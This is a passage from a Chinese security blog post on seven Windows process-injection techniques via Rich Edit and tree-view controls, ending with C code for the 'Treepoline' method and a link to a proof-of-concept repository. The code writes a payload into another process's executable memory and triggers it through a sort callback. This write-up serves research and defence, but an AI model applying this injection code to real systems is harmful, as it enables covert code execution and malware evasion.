RWX memory and copy the payload there.</span><br>    cs = VirtualAllocEx(hp, <span class="hljs-literal">NULL</span>, payloadSize,<br>        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>       <br>    WriteProcessMemory(hp, cs, payload, payloadSize, &amp;wr);<br>   <br>    <span class="hljs-comment">// 4. Obtain the root item in tree list</span><br>    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, <span class="hljs-number">0</span>);<br> <br>    tvs.hParent     = item;<br>    tvs.lpfnCompare = cs;<br>    tvs.lParam      = <span class="hljs-number">0</span>;<br>   <br>    <span class="hljs-comment">// 5. Allocate RW memory and copy the TVSORTCB structure</span><br>    ds = VirtualAllocEx(hp, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(TVSORTCB),<br>        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>       <br>    WriteProcessMemory(hp, ds, &amp;tvs, <span class="hljs-keyword">sizeof</span>(TVSORTCB), &amp;wr);<br>   <br>    <span class="hljs-comment">// 6. Trigger payload</span><br>    SendMessage(tlv, TVM_SORTCHILDRENCB, <span class="hljs-number">0</span>, (LPARAM)ds);<br> <br>    <span class="hljs-comment">// 7. Free memory and close process handle</span><br>    VirtualFreeEx(hp, ds, <span class="hljs-number">0</span>, MEM_DECOMMIT | MEM_RELEASE);<br>    VirtualFreeEx(hp, cs, <span class="hljs-number">0</span>, MEM_DECOMMIT | MEM_RELEASE);<br>   <br>    CloseHandle(hp);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/odzhan/injection/tree/master/richedit">https://github.com/odzhan/injection/tree/master/richedit</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2022/11/03/dev/code/dfs_bfs/">← Next BFS and DFS</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2022/10/27/english/english/">English Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="/images/header.jpg" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9A%847%E4%B8%AD%E6%96%B9%E6%B3%95"><span class="toc-text">Windows进程注入的7中方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ERich-Edit%E6%8E%A7%E4%BB%B6"><span class="toc-text">关于Rich Edit控件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9AWordWarping"><span class="toc-text">方法1：WordWarping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9AHyphentension"><span class="toc-text">方法2：Hyphentension</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AAutoCourgette"><span class="toc-text">方法3：AutoCourgette</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9AStreamception"><span class="toc-text">方法4：Streamception</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9AOleum"><span class="toc-text">方法5：Oleum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%956%EF%BC%9AListPlanting"><span class="toc-text">方法6：ListPlanting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%957%EF%BC%9ATreepoline"><span class="toc-text">方法7：Treepoline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>